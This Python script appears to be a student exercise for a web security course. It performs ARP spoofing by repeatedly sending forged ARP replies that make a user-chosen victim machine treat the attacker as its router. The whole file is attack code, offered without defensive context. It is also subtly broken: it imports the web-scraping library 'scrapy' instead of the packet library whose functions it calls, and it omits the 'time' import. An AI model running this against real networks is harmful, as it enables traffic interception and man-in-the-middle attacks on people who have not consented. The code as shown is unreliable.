"""
    Autor: Isaac Sánchez Verdiguel
    Materia: Web Security
"""

import scrapy

def arp_spoof(victim_ip, router_ip):
    victim_mac = getmacbyip(victim_ip)
    router_mac = getmacbyip(router_ip)
    arp_response = ARP(pdst=victim_ip, hwdst=victim_mac, psrc=router_ip, op='is-at')

    print(f"Enviando paquetes ARP a {victim_ip} para suplantar al router {router_ip}")
    
    try:
        while True:
            send(arp_response, verbose=0)
            time.sleep(2)
    except KeyboardInterrupt:
        print("Deteniendo ARP Spoofing")

if __name__ == "__main__":
    victim_ip = input("Ingrese la IP de la máquina víctima: ")
    router_ip = input("Ingrese la IP del router: ")
    arp_spoof(victim_ip, router_ip)
